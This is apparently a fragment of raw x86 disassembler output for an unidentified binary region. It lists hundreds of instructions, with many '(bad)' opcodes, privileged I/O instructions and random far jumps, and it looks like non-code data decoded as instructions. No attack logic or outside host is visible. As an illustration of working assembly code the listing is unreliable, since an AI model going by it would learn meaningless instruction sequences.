  429b9f:	fmul   QWORD PTR [ecx+0x6]
  429ba2:	sub    al,0x66
  429ba4:	aad    0x8e
  429ba6:	into   
  429ba7:	(bad)  
  429ba8:	addr16 push ebx
  429baa:	(bad)  
  429bab:	mov    esp,0x3f7d5296
  429bb0:	sub    DWORD PTR [edx+0x3b2c3f],ecx
	...
  429c16:	mov    ds:0xb788a616,eax
  429c1b:	mov    eax,0x52a3faf
  429c20:	xchg   esp,eax
  429c21:	pop    eax
  429c22:	scas   al,BYTE PTR es:[edi]
  429c23:	pop    eax
  429c24:	les    ecx,FWORD PTR fs:[esi+edi*4+0x1]
  429c29:	add    BYTE PTR [edi],al
  429c2b:	add    DWORD PTR [eax],eax
  429c2d:	add    BYTE PTR [eax],al
  429c2f:	imul   ecx,eax,0xffffffd7
  429c32:	vpsrlw ymm3,ymm0,XMMWORD PTR [eax]
  429c36:	or     esp,edi
  429c38:	xchg   DWORD PTR [ebx],ebp
  429c3a:	jl     0x429c87
  429c3c:	retf   0x58ac
  429c3f:	dec    edx
  429c40:	mov    edx,0x14f35e41
  429c45:	clc    
  429c46:	nop
  429c47:	mov    ecx,fs
  429c49:	sar    BYTE PTR [ecx+edx*4],1
  429c4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429c4d:	lds    esi,FWORD PTR [edi+eiz*2]
  429c50:	(bad)  
  429c51:	adc    ebp,DWORD PTR [ebp+0x45c9d00d]
  429c57:	call   0x8c0a:0xe7496bb
  429c5e:	scas   al,BYTE PTR es:[edi]
  429c5f:	(bad)  
  429c60:	jg     0x429c7c
  429c62:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  429c64:	push   ebp
  429c65:	or     al,0xdd
  429c67:	mov    bh,0x8e
  429c69:	xchg   ecx,eax
  429c6a:	int    0x20
  429c6c:	push   0x61bc06f2
  429c71:	jg     0x429cbc
  429c73:	mov    WORD PTR ds:[ebx],?
  429c76:	fucomp st(6)
  429c78:	add    eax,0xc03b59f2
  429c7d:	fisub  WORD PTR [ebx+0x4ce052d8]
  429c83:	popa   
  429c84:	mov    ds:0xc90d564c,eax
  429c89:	bound  ebp,QWORD PTR [ebp+0x7]
  429c8c:	mov    dl,0x44
  429c8e:	and    bh,BYTE PTR [ebx-0x22]
  429c91:	jae    0x429c41
  429c93:	dec    esp
  429c94:	add    eax,0x8b316b17
  429c99:	pop    edx
  429c9a:	aas    
  429c9b:	add    bl,0xd8
  429c9e:	rol    DWORD PTR [ecx-0x16],0x10
  429ca2:	mov    edi,0x21069cda
  429ca7:	clc    
  429ca8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ca9:	or     DWORD PTR [ebx],ebp
  429cab:	fcomp  DWORD PTR [eax-0x2223b2ff]
  429cb1:	popf   
  429cb2:	fisub  WORD PTR [edx]
  429cb4:	sbb    esp,edi
  429cb6:	loopne 0x429ccb
  429cb8:	or     DWORD PTR [ebp-0x5d70d21f],eax
  429cbe:	xor    eax,DWORD PTR [esi-0x5d]
  429cc1:	scas   eax,DWORD PTR es:[edi]
  429cc2:	mov    al,ds:0x8d8e4fef
  429cc7:	mov    WORD PTR [edi+0xb],fs
  429cca:	jmp    FWORD PTR [ecx+0x4c]
  429ccd:	pop    ebp
  429cce:	mov    ah,0xfb
  429cd0:	fild   DWORD PTR [ecx-0x7633bcc9]
  429cd6:	sbb    DWORD PTR [eiz*8-0x3419b4ee],ebp
  429cdd:	sub    BYTE PTR [edx],dl
  429cdf:	fmul   DWORD PTR [edx-0x7698474e]
  429ce5:	push   ds
  429ce6:	test   BYTE PTR [ebx+0x10a20dfc],ah
  429cec:	or     esp,ebp
  429cee:	mov    bl,0xb0
  429cf0:	repnz (bad) 
  429cf2:	xchg   esp,eax
  429cf3:	fcomp  DWORD PTR [esi+0x37ce8526]
  429cf9:	pop    ecx
  429cfa:	cmp    DWORD PTR [esi-0x6087a2a8],ebp
  429d00:	inc    eax
  429d01:	xlat   BYTE PTR ds:[ebx]
  429d02:	mov    dl,0x82
  429d04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429d05:	test   al,0xad
  429d08:	pop    esp
  429d09:	mov    al,ds:0xe1a97722
  429d0e:	jp     0x429d73
  429d10:	mov    ebp,0x37dbaaa7
  429d15:	pop    ebx
  429d16:	xor    eax,0x4a12f13f
  429d1b:	test   eax,0x303c2200
  429d20:	aad    0x83
  429d22:	add    dh,0xb1
  429d25:	jle    0x429d21
  429d27:	scas   al,BYTE PTR es:[edi]
  429d28:	scas   eax,DWORD PTR es:[edi]
  429d29:	into   
  429d2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d2b:	push   DWORD PTR ds:0x3fd850e
  429d31:	aaa    
  429d32:	adc    cl,BYTE PTR [edi+0x7d]
	...
  429d95:	add    BYTE PTR [ebx-0x13f33b49],bl
  429d9b:	jg     0x429d78
  429d9d:	mov    bh,0xb8
  429d9f:	xor    al,0xdf
  429da1:	sub    eax,0xd207d71b
  429da6:	push   ebx
  429da7:	mov    edi,0x1070001
  429dac:	add    BYTE PTR [eax],al
  429dae:	fnstcw WORD PTR [eax-0x7c]
  429db1:	pusha  
  429db2:	sbb    BYTE PTR [ebp-0x14ec442c],ah
  429db8:	xchg   ebp,eax
  429db9:	repz ja 0x429d5e
  429dbc:	rcr    esi,0xda
  429dbf:	fst    QWORD PTR [eax-0x25870b82]
  429dc5:	imul   BYTE PTR [ecx]
  429dc7:	dec    di
  429dc9:	mov    eax,ds:0xdff660e8
  429dce:	jg     0x429e2e
  429dd0:	mov    DWORD PTR [ebx+0x585986fc],edx
  429dd6:	inc    ebx
  429dd7:	jb     0x429e41
  429dd9:	iret   
  429dda:	xchg   ebx,eax
  429ddb:	mov    eax,0xb300d8d4
  429de0:	aam    0xb7
  429de2:	inc    eax
  429de3:	jmp    0x7b063274
  429de8:	inc    esp
  429de9:	cdq    
  429dea:	call   0x3842615e
  429def:	push   eax
  429df0:	push   ds
  429df1:	ficom  WORD PTR [ebx+0x177d6151]
  429df7:	push   cs
  429df8:	mov    ebx,cs
  429dfa:	xchg   BYTE PTR [edx+0x5b],dl
  429dfd:	and    al,0xe3
  429dff:	dec    esp
  429e00:	inc    eax
  429e01:	add    ebp,ebp
  429e03:	in     eax,0xba
  429e05:	pushf  
  429e06:	lock or eax,0xb57cd87c
  429e0c:	iret   
  429e0d:	cmc    
  429e0e:	fstp   DWORD PTR [ecx+0x1a2c1ea8]
  429e14:	mov    ebx,ss
  429e16:	div    BYTE PTR [ebx+0x7c766b4f]
  429e1c:	loopne 0x429e54
  429e1e:	adc    ah,BYTE PTR [esi]
  429e20:	push   es
  429e21:	hlt    
  429e22:	call   DWORD PTR [eax-0x5f7d0719]
  429e28:	shl    ch,cl
  429e2a:	xchg   esp,eax
  429e2b:	xchg   ebx,eax
  429e2c:	es mov al,0x57
  429e2f:	xor    DWORD PTR [ebp+ebx*1-0xf],edi
  429e33:	idiv   DWORD PTR [eax-0x6b]
  429e36:	gs cmp ebp,esi
  429e39:	test   DWORD PTR [edx],ebx
  429e3b:	pop    ecx
  429e3c:	jbe    0x429e56
  429e3e:	clc    
  429e3f:	test   BYTE PTR [eax-0xa],al
  429e42:	cld    
  429e43:	and    eax,0x843fa183
  429e48:	mov    esi,0xb25491b3
  429e4d:	mov    esi,0xfd51adf1
  429e52:	sub    DWORD PTR [edi-0x3a],edx
  429e55:	sbb    DWORD PTR [ebx+0x10d4e38d],eax
  429e5b:	call   0x90c6ce27
  429e60:	pusha  
  429e61:	retf   0xc987
  429e64:	in     al,dx
  429e65:	int3   
  429e66:	inc    ebp
  429e67:	push   edi
  429e68:	xchg   esp,eax
  429e69:	(bad)  
  429e6a:	sbb    dl,BYTE PTR ds:0x50a38c3c
  429e70:	fadd   DWORD PTR [ebp+0x33]
  429e73:	cmp    DWORD PTR [ebp-0x61086d66],esp
  429e79:	mov    bh,0x4f
  429e7b:	sub    al,0x6
  429e7d:	or     ecx,DWORD PTR [esi]
  429e7f:	ret    
  429e80:	mov    dl,0x9e
  429e82:	dec    edx
  429e83:	loopne 0x429efa
  429e85:	push   ebx
  429e86:	inc    eax
  429e87:	add    ah,BYTE PTR [bx+0xf]
  429e8b:	(bad)  
  429e8c:	inc    esp
  429e8d:	sub    al,BYTE PTR [ebp+0x18]
  429e90:	leave  
  429e91:	adc    DWORD PTR [edi-0x60032ae6],ebx
  429e97:	int    0xc7
  429e99:	in     eax,0xae
  429e9b:	inc    ecx
  429e9c:	sub    cl,bh
  429e9e:	add    ch,BYTE PTR [ebp+0x21]
  429ea1:	sbb    al,0x37
  429ea3:	(bad)
  429ea6:	(bad)  
  429ea7:	dec    eax
  429ea8:	outs   dx,BYTE PTR ds:[esi]
  429ea9:	mov    ebx,0xce6434d9
  429eae:	add    bh,BYTE PTR [ebp+0x2a]
  429eb1:	in     al,dx
  429eb2:	jmp    DWORD PTR [ebp+0x6a]
	...
  429f14:	add    BYTE PTR [eax],al
  429f16:	xor    DWORD PTR [ebp-0x38],eax
  429f19:	push   es
  429f1a:	cld    
  429f1b:	(bad)  
  429f1c:	push   DWORD PTR [edi+0x54]
  429f1f:	into   
  429f20:	fnstcw WORD PTR ds:0x43f5fae8
  429f26:	pop    edx
  429f27:	rol    BYTE PTR [ecx],0x0
  429f2a:	pop    es
  429f2b:	add    DWORD PTR [eax],eax
  429f2d:	add    BYTE PTR [ebp+0x37],dh
  429f30:	push   ss
  429f31:	ins    DWORD PTR es:[edi],dx
  429f32:	dec    eax
  429f33:	out    dx,eax
  429f34:	sub    DWORD PTR [esi+0x12],ecx
  429f37:	ror    BYTE PTR [ecx+0xaa8704],0x73
  429f3e:	addr16 push 0xecf2dc9d
  429f44:	clc    
  429f45:	push   es
  429f46:	jns    0x429fb1
  429f48:	and    al,0x93
  429f4a:	das    
  429f4b:	or     DWORD PTR [ebp+0x1bc79eaa],ebp
  429f51:	hlt    
  429f52:	jge    0x429f39
  429f54:	lahf   
  429f55:	xchg   BYTE PTR [ecx-0x26853e23],ch
  429f5b:	aam    0x2d
  429f5d:	in     eax,0x93
  429f5f:	xchg   edx,eax
  429f60:	call   0x9258:0xb5c681f4
  429f67:	sbb    ebx,esp
  429f69:	out    dx,eax
  429f6a:	jne    0x429f41
  429f6c:	retf   
  429f6d:	or     eax,DWORD PTR [edx-0x580dafeb]
  429f73:	aam    0x1c
  429f75:	aas    
  429f76:	ss jmp 0x429f14
  429f79:	imul   ebx,eax,0x93c77763
  429f7f:	(bad)
  429f83:	inc    esi
  429f84:	and    ebp,0xffffffb7
  429f87:	iret   
  429f88:	shl    BYTE PTR [ebp-0x2b29e253],cl
  429f8e:	hlt    
  429f8f:	mov    ecx,0x43f73f50
  429f94:	jbe    0x429f63
  429f96:	inc    edi
  429f97:	loope  0x429f34
  429f99:	lods   al,BYTE PTR ds:[esi]
  429f9a:	das    
  429f9b:	lods   al,BYTE PTR ds:[esi]
  429f9c:	out    0xce,al
  429f9e:	xchg   esp,eax
  429f9f:	in     eax,0xa8
  429fa1:	pop    ebx
  429fa2:	into   
  429fa3:	frndint 
  429fa5:	cmp    dh,BYTE PTR [esi+ebp*1-0x27]
  429fa9:	mov    dh,BYTE PTR ds:0x8274f713
  429faf:	(bad)  [eax-0x7dc30a3a]
  429fb5:	sti    
  429fb6:	sub    eax,DWORD PTR [ebx]
  429fb8:	adc    DWORD PTR [esi-0x1b],0x737c187e
  429fbf:	out    0xf8,al
  429fc1:	imul   esi,DWORD PTR [eax],0xa8494566
  429fc7:	sbb    ebx,DWORD PTR [esi+0x5c717ece]
  429fcd:	ds inc edi
  429fcf:	or     BYTE PTR [ebp+0x1a2820],0xb5
  429fd6:	in     al,0xfa
  429fd8:	out    0x3f,al
  429fda:	pop    ss
  429fdb:	outs   dx,BYTE PTR ds:[esi]
  429fdc:	fwait
  429fdd:	aad    0xce
  429fdf:	dec    ebx
  429fe0:	add    BYTE PTR [ebx+edi*1+0x32],ah
  429fe4:	mov    ds:0x64085598,eax
  429fe9:	inc    esp
  429fea:	add    BYTE PTR [ecx],al
  429fec:	inc    esi
  429fed:	test   DWORD PTR [eax+eax*1],edi
  429ff0:	xchg   esp,eax
  429ff1:	add    cl,dl
  429ff3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429ff4:	jmp    0x5da7a355
  429ff9:	nop
  429ffa:	data16 mov WORD PTR [ecx],gs
  429ffd:	sub    BYTE PTR [edx-0x3807f88a],dh
  42a003:	mov    DWORD PTR [edx+0x1950e543],ecx
  42a009:	jge    0x42a022
  42a00b:	inc    eax
  42a00c:	xor    eax,0x7532add
  42a011:	xor    eax,0xcdc3e2a0
  42a016:	imul   ebx,DWORD PTR [esi-0x7edeef34],0xcba96804
  42a020:	mov    ds:0x6f6ae2e6,eax
  42a025:	pop    es
  42a026:	mov    al,ds:0x1a52719a
  42a02b:	pop    edi
  42a02c:	fsubr  QWORD PTR [edi]
  42a02e:	sbb    edi,0xffffffc7
  42a031:	fwait
  42a032:	sbb    al,0x4f
  42a034:	xchg   esp,eax
	...
  42a095:	add    bh,dl
  42a097:	pushf  
  42a098:	shr    BYTE PTR [ebp-0x1000235],0x30
  42a09f:	xchg   esi,eax
  42a0a0:	mov    esi,0xe7bc7e4e
  42a0a5:	stos   BYTE PTR es:[edi],al
  42a0a6:	popa   
  42a0a7:	rol    DWORD PTR [ecx],0x0
  42a0aa:	pop    es
  42a0ab:	add    DWORD PTR [eax],eax
  42a0ad:	add    ah,ch
  42a0af:	addr16 icebp 
  42a0b1:	pop    edx
  42a0b2:	data16 hlt 
  42a0b4:	dec    ebp
  42a0b5:	adc    ah,BYTE PTR [edi+edi*4]
  42a0b8:	lahf   
  42a0b9:	(bad)  
  42a0ba:	retf   
  42a0bb:	jecxz  0x42a10a
  42a0bd:	push   es
  42a0be:	stos   DWORD PTR es:[edi],eax
  42a0bf:	ret    
  42a0c0:	int3   
  42a0c1:	fsubp  st(5),st
  42a0c3:	sub    edx,DWORD PTR [ebx+ebx*8-0x2667ac7a]
  42a0ca:	mov    cl,0x32
  42a0cc:	jmp    0x42a14a
  42a0ce:	mov    bl,0xef
  42a0d0:	push   edx
  42a0d1:	das    
  42a0d2:	je     0x42a07c
  42a0d4:	call   0xaca2:0xf10eed59
  42a0db:	mov    eax,ds:0x96ad4a0
  42a0e0:	test   eax,0x26344ab9
  42a0e5:	les    edx,FWORD PTR [ecx-0x2e929cb7]
  42a0eb:	push   ss
  42a0ec:	and    ah,BYTE PTR [edi+0x515e9066]
  42a0f2:	sbb    al,0x6b
  42a0f4:	xor    dh,0x37
  42a0f7:	xor    eax,0x557b0ef2
  42a0fc:	adc    esp,DWORD PTR [esi+eiz*4+0x2e83a3d6]
  42a103:	loope  0x42a0fa
  42a105:	leave  
  42a106:	push   ebp
  42a107:	pop    ebx
  42a108:	push   0xc3938cf1
  42a10d:	sub    dl,BYTE PTR [edi+0x239d6adb]
  42a113:	mov    esi,0xb78dc981
  42a118:	adc    al,0x3d
  42a11a:	shr    BYTE PTR [esi+0x304b9c8b],0x76
  42a121:	cdq    
  42a122:	dec    edi
  42a123:	inc    ebx
  42a124:	idiv   BYTE PTR [esi+eax*2+0x64]
  42a128:	ss push esi
  42a12a:	sbb    ah,BYTE PTR [ebx-0x7ac25abb]
  42a130:	jae    0x42a18b
  42a132:	push   eax
  42a133:	sahf   
  42a134:	dec    ebx
  42a135:	cmp    al,0xf6
  42a137:	dec    DWORD PTR [eax+0x2301b934]
  42a13d:	sub    edi,DWORD PTR [di]
  42a140:	fcmovbe st,st(1)
  42a142:	mov    ebx,0xf1423ce
  42a147:	mov    cl,0x70
  42a149:	inc    esi
  42a14a:	out    dx,eax
  42a14b:	cwde   
  42a14c:	shl    DWORD PTR [ecx+0x29],0x9f
  42a150:	or     BYTE PTR [edi+0x73],0xc5
  42a154:	or     al,0xfd
  42a156:	cdq    
  42a157:	inc    esp
  42a158:	push   esp
  42a159:	sbb    esi,DWORD PTR [esi-0x73f64bc]
  42a15f:	sahf   
  42a160:	repz sub DWORD PTR [edi],0x2883da41
  42a167:	push   ebx
  42a168:	fsubrp st(2),st
  42a16a:	cmp    ah,BYTE PTR [esi-0x78a6bbd8]
  42a170:	jmp    0x60ebbefa
  42a175:	xchg   edi,eax
  42a176:	fucomip st,st(2)
  42a178:	or     ebp,DWORD PTR [ecx+0x4aefb3de]
  42a17e:	imul   eax,DWORD PTR [eax-0x5a],0x1f501e50
  42a185:	mov    eax,0x2eea929f
  42a18a:	test   BYTE PTR [ebp-0x1],ch
  42a18d:	fld1   
  42a18f:	xor    al,0xdc
  42a191:	push   ds
  42a192:	push   eax
  42a193:	or     eax,0x5a3fd12f
  42a198:	mov    bl,0xdf
  42a19a:	add    DWORD PTR [ebx],0x68
  42a19d:	adc    BYTE PTR [esi+0x5e561d89],bh
  42a1a3:	mov    DWORD PTR [edx+0x153bc204],eax
  42a1a9:	dec    edi
  42a1aa:	hlt    
  42a1ab:	mov    ah,0x69
  42a1ad:	out    0x79,al
  42a1af:	icebp  
  42a1b0:	add    BYTE PTR [edi+0x43662c],0x0
	...
  42a213:	add    BYTE PTR [eax],al
  42a215:	add    BYTE PTR [ebx],ch
  42a217:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a21d:	mov    bh,0x15
  42a21f:	fucomip st,st(5)
  42a221:	imul   ebp,DWORD PTR [edx+edx*2-0x26],0x1c2687f
  42a229:	add    BYTE PTR [edi],al
  42a22b:	add    DWORD PTR [eax],eax
  42a22d:	add    bh,al
  42a22f:	xor    eax,0x81d117b
  42a234:	push   edi
  42a235:	fcom   DWORD PTR [esi]
  42a237:	sahf   
  42a238:	xor    bh,al
  42a23a:	mov    esi,0x30c1f1f8
  42a23f:	jmp    0x6d9d58f4
  42a244:	outs   dx,DWORD PTR ds:[esi]
  42a245:	sbb    eax,0x741f41fe
  42a24a:	sub    al,0x4b
  42a24c:	xchg   esi,eax
  42a24d:	sbb    ebp,DWORD PTR [ecx-0x4b513eec]
  42a253:	push   edi
  42a254:	ret    0xc752
  42a257:	test   DWORD PTR [edx+0x3c],eax
  42a25a:	(bad)  
  42a25c:	loopne 0x42a294
  42a25e:	mov    al,0x4b
  42a260:	mov    bh,0xaa
  42a262:	mov    bl,0xb4
  42a264:	loop   0x42a264
  42a266:	xor    BYTE PTR [ebp+0x39d59803],bh
  42a26c:	sahf   
  42a26d:	xor    ebp,edx
  42a26f:	outs   dx,BYTE PTR fs:[esi]
  42a271:	out    0x68,al
  42a273:	out    dx,al
  42a274:	loope  0x42a2e2
  42a276:	sub    dh,0x18
  42a279:	inc    eax
  42a27a:	dec    ebp
  42a27b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a27c:	pop    edi
  42a27d:	dec    BYTE PTR [esi-0x4]
  42a280:	jo     0x42a2e4
  42a282:	dec    edx
  42a283:	xchg   esi,eax
  42a284:	mov    ebp,esp
  42a286:	jbe    0x42a249
  42a288:	int3   
  42a289:	pop    esi
  42a28a:	leave  
  42a28b:	iret   
  42a28c:	adc    BYTE PTR [edx],bl
  42a28e:	xchg   ecx,eax
  42a28f:	dec    ecx
  42a290:	mov    dl,0x63
  42a292:	shl    BYTE PTR [edx-0x1ffdff96],cl
  42a298:	sahf   
  42a299:	dec    ebp
  42a29a:	daa    
  42a29b:	fcmovb st,st(7)
  42a29d:	ins    BYTE PTR es:[edi],dx
  42a29e:	pop    edi
  42a29f:	cld    
  42a2a0:	sbb    ecx,0x59bd125b
  42a2a6:	lahf   
  42a2a7:	and    BYTE PTR [ebp+0x12220d6d],0x9
  42a2ae:	jmp    0x42a31f
  42a2b0:	inc    ebx
  42a2b1:	or     DWORD PTR [edx+0x3c37e12a],edi
  42a2b7:	fs jbe 0x42a302
  42a2ba:	add    al,0x98
  42a2bd:	jmp    0xd6fa:0xa0e30b81
  42a2c4:	inc    edi
  42a2c5:	pop    es
  42a2c6:	addr16 mov dh,0xff
  42a2c9:	push   esi
  42a2ca:	ins    BYTE PTR es:[edi],dx
  42a2cb:	fnstcw WORD PTR [ecx-0x7b]
  42a2ce:	adc    edi,DWORD PTR [edx+0x5d]
  42a2d1:	mov    WORD PTR [edi+edx*2],ds
  42a2d4:	fmul   DWORD PTR [edi]
  42a2d6:	mov    al,0xc2
  42a2d8:	cmp    edi,DWORD PTR [edi+0x72]
  42a2db:	int    0xdc
  42a2dd:	pop    ebx
  42a2de:	sbb    DWORD PTR ds:0xed963acd,edi
  42a2e4:	dec    ecx
  42a2e5:	jmp    FWORD PTR ss:[edx+0x35b1ea35]
  42a2ec:	popa   
  42a2ed:	pop    eax
  42a2ee:	icebp  
  42a2ef:	xchg   ecx,eax
  42a2f0:	pop    ebx
  42a2f1:	in     al,dx
  42a2f2:	xchg   ebp,eax
  42a2f3:	jns    0x42a277
  42a2f5:	xlat   BYTE PTR ds:[ebx]
  42a2f6:	scas   eax,DWORD PTR es:[edi]
  42a2f7:	xor    DWORD PTR [eax],esi
  42a2f9:	cmp    ebx,DWORD PTR ss:[edx-0x37cd2328]
  42a300:	mov    al,ds:0x7b9d1fc3
  42a305:	ror    BYTE PTR [ecx],cl
  42a307:	or     al,0x97
  42a309:	xchg   edx,eax
  42a30a:	adc    eax,0x859838b
  42a30f:	or     al,0x40
  42a311:	add    eax,edx
  42a313:	pop    esp
  42a314:	in     al,0x2f
  42a316:	icebp  
  42a317:	aad    0x11
  42a319:	push   esi
  42a31a:	xchg   di,ax
  42a31c:	test   BYTE PTR [edx+0x57],bl
  42a31f:	pop    es
  42a320:	pushf  
  42a321:	out    0x1c,al
  42a323:	jmp    0x660:0x35504f92
  42a32a:	adc    DWORD PTR [ebp+0x117cbc29],eax
  42a330:	xor    eax,DWORD PTR [esi]
  42a332:	jnp    0x42a2d6
  42a334:	das    
	...
  42a395:	add    BYTE PTR [edi+0xe],bh
  42a398:	jne    0x42a3d5
  42a39a:	jne    0x42a417
  42a39c:	jg     0x42a3ec
  42a39e:	ds loop 0x42a3ca
  42a3a1:	retf   0x40a3
  42a3a4:	and    BYTE PTR [edi],bl
  42a3a6:	outs   dx,DWORD PTR ds:[esi]
  42a3a7:	ret    
  42a3a8:	add    DWORD PTR [eax],eax
  42a3aa:	pop    es
  42a3ab:	add    DWORD PTR [eax],eax
  42a3ad:	add    BYTE PTR [ebp-0x1],bh
  42a3b0:	fwait
  42a3b1:	lahf   
  42a3b2:	pushf  
  42a3b3:	test   BYTE PTR [ecx],bl
  42a3b5:	ins    DWORD PTR es:[edi],dx
  42a3b6:	shr    ebx,0xc
  42a3b9:	fwait
  42a3ba:	loope  0x42a34a
  42a3bc:	aad    0xc6
  42a3be:	sbb    edi,edi
  42a3c0:	cmp    edx,DWORD PTR [ebx-0x217cdd34]
  42a3c6:	cmp    BYTE PTR [ecx+0x6c],al
  42a3c9:	add    al,0x6d
  42a3cb:	mov    dh,0xd4
  42a3cd:	mov    DWORD PTR [eax-0x5e006ba4],0xbb418471
  42a3d7:	imul   edx,DWORD PTR [eax],0xd24f9574
  42a3dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a3de:	ins    BYTE PTR es:[edi],dx
  42a3df:	icebp  
  42a3e0:	sbb    ebx,DWORD PTR [edi]
  42a3e2:	xlat   BYTE PTR ds:[ebx]
  42a3e3:	mov    BYTE PTR [edx-0x20642a7b],bh
  42a3e9:	cmc    
  42a3ea:	retf   0x1423
  42a3ed:	and    al,0x53
  42a3ef:	sahf   
  42a3f0:	dec    esp
  42a3f1:	fs fs jbe 0x42a3fb
  42a3f5:	xchg   ebx,eax
  42a3f6:	imul   ecx,esi,0x14
  42a3f9:	nop
  42a3fa:	jg     0x42a394
  42a3fc:	or     DWORD PTR [ebx+0x7c7fa57d],edi
  42a402:	sbb    DWORD PTR [ebp+0x5c],ecx
  42a405:	shr    BYTE PTR [ebp+ebx*4+0x7b87a7f2],1
  42a40c:	cmp    BYTE PTR [ebp+0x7535e51b],dh
  42a412:	cmp    ah,BYTE PTR [eax-0x2b5ae73e]
  42a418:	jnp    0x42a482
  42a41a:	mov    dl,0x9c
  42a41c:	(bad)  
  42a41e:	pop    esi
  42a41f:	mov    al,ds:0x5ebc460b
  42a424:	stc    
  42a425:	xchg   esp,eax
  42a426:	mov    ebp,0xf74a2f18
  42a42b:	inc    ecx
  42a42c:	(bad)  
  42a42d:	mov    eax,0x1902d1cc
  42a432:	daa    
  42a433:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a434:	dec    ebp
  42a435:	shl    DWORD PTR [ebx+esi*2],0xe
  42a439:	jl     0x42a47b
  42a43b:	add    DWORD PTR [edi-0x15],ebx
  42a43e:	pop    ebp
  42a43f:	xor    BYTE PTR [eax+0x28e25b75],dl
  42a445:	ss jmp 0x42a460
  42a448:	sar    DWORD PTR [esi],1
  42a44a:	pop    esi
  42a44b:	push   cs
  42a44c:	xor    eax,0xb325c612
  42a451:	add    BYTE PTR [ecx],dl
  42a453:	ss jne 0x42a3e5
  42a456:	pop    edi
  42a457:	push   edx
  42a458:	cli    
  42a459:	ins    BYTE PTR es:[edi],dx
  42a45a:	mov    BYTE PTR [ecx+0xfb60a53],ah
  42a460:	mov    ecx,0xdaad8d23
  42a465:	add    eax,0x8e2945e
  42a46a:	xor    al,0xc3
  42a46c:	cmp    DWORD PTR [esi-0x2fefae33],esp
  42a472:	scas   al,BYTE PTR es:[edi]
  42a473:	and    eax,edi
  42a475:	jge    0x42a45a
  42a477:	xchg   ebx,eax
  42a478:	sub    al,BYTE PTR [ebp+0x6212f592]
  42a47e:	pop    eax
  42a47f:	arpl   WORD PTR [edi-0x7ba9d73a],di
  42a485:	test   BYTE PTR [ecx-0x69],ah
  42a488:	std    
  42a489:	ja     0x42a476
  42a48b:	sub    ch,BYTE PTR [edx+0x9]
  42a48e:	push   es
  42a48f:	jl     0x42a4f7
  42a491:	mov    dl,0x6
  42a493:	jmp    FWORD PTR [edi+ebx*8-0x3b]
  42a497:	test   eax,0xfcc0b23f
  42a49c:	inc    edx
  42a49d:	rol    DWORD PTR [edi],cl
  42a49f:	(bad)  
  42a4a0:	loopne 0x42a477
  42a4a2:	aam    0x61
  42a4a4:	xor    eax,0x21b590fe
  42a4a9:	clc    
  42a4aa:	test   eax,0xf63ae37b
  42a4af:	dec    esi
  42a4b0:	inc    esi
  42a4b1:	cmp    ch,bl
  42a4b3:	sar    DWORD PTR [esi+0x0],cl
	...
  42a515:	add    BYTE PTR [eax],bl
  42a517:	dec    edi
  42a518:	pop    ss
  42a519:	mov    ecx,0xefbef957
  42a51e:	mov    cl,0xd7
  42a520:	dec    ebp
  42a521:	add    cl,BYTE PTR [ecx+ebp*4]
  42a524:	inc    ebx
  42a525:	fdiv   DWORD PTR [esi-0x3c]
  42a528:	add    DWORD PTR [eax],eax
  42a52a:	pop    es
  42a52b:	add    DWORD PTR [eax],eax
  42a52d:	add    BYTE PTR [eax+0x4e],ch
  42a530:	data16 (bad) 
  42a532:	fisttp DWORD PTR [ecx+0x11]
  42a535:	jbe    0x42a4d3
  42a537:	imul   ebp,DWORD PTR [ebx-0x69],0x2577c03d
  42a53e:	adc    ah,ch
  42a540:	(bad)  
  42a541:	mov    ah,0x1f
  42a543:	mov    bh,0xd7
  42a545:	jne    0x42a502
  42a547:	call   0xe65d:0x2f779625
  42a54e:	jg     0x42a57a
  42a550:	pop    edi
  42a551:	dec    cx
  42a553:	fidivr WORD PTR [ebp+0x3a]
  42a556:	daa    
  42a557:	test   ebp,eax
  42a559:	or     ah,BYTE PTR [ebx]
  42a55b:	xchg   esp,esp
  42a55d:	rcr    bh,1
  42a55f:	adc    al,0xa8
  42a561:	test   eax,0xad80cb77
  42a566:	inc    ebx
  42a567:	sbb    BYTE PTR ds:0x978d5930,bl
  42a56d:	dec    esi
  42a56e:	std    
  42a56f:	sbb    eax,0x15f112eb
  42a574:	inc    eax
  42a575:	fs test eax,0x50300ff4
  42a57b:	imul   ecx,DWORD PTR [ebx],0x2b4db95a
  42a581:	inc    eax
  42a582:	scas   eax,DWORD PTR es:[edi]
  42a583:	(bad)  
  42a584:	jb     0x42a5a7
  42a586:	sahf   
  42a587:	fisubr WORD PTR [ebx+0xf]
  42a58a:	or     eax,0xc6cde2d1
  42a58f:	cmp    ecx,esi
  42a591:	xchg   edx,eax
  42a592:	inc    esi
  42a593:	in     eax,0xe6
  42a595:	add    bh,BYTE PTR [edx]
  42a597:	push   0x3c32e542
  42a59c:	gs int 0x88
  42a59f:	jle    0x42a52e
  42a5a1:	loop   0x42a620
  42a5a3:	mov    DWORD PTR [eax-0x4],esi
  42a5a6:	mov    dh,0xfd
  42a5a8:	jle    0x42a609
  42a5aa:	mov    al,ds:0xe9976a45
  42a5af:	(bad)  
  42a5b0:	sti    
  42a5b1:	aas    
  42a5b2:	hlt    
  42a5b3:	loope  0x42a5ab
  42a5b5:	cmp    ebx,DWORD PTR [edi+0x6a906879]
  42a5bb:	mov    edx,0xb884fdd
  42a5c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a5c1:	add    al,0x65
  42a5c3:	jno    0x42a630
  42a5c5:	retf   0xb2ef
  42a5c8:	xchg   esi,eax
  42a5c9:	sub    eax,0x80cef2f3
  42a5ce:	sub    eax,0xf47153be
  42a5d3:	aam    0x43
  42a5d5:	inc    ebp
  42a5d6:	bsf    ecx,esp
  42a5d9:	pusha  
  42a5da:	in     eax,dx
  42a5db:	adc    bh,BYTE PTR [edx+0x4d]
  42a5de:	out    0x4e,al
  42a5e0:	sbb    al,0x6
  42a5e2:	add    edi,esp
  42a5e4:	cmp    esi,edi
  42a5e6:	lock fmul DWORD PTR [edi]
  42a5e9:	shr    ah,1
  42a5eb:	xchg   ebx,edx
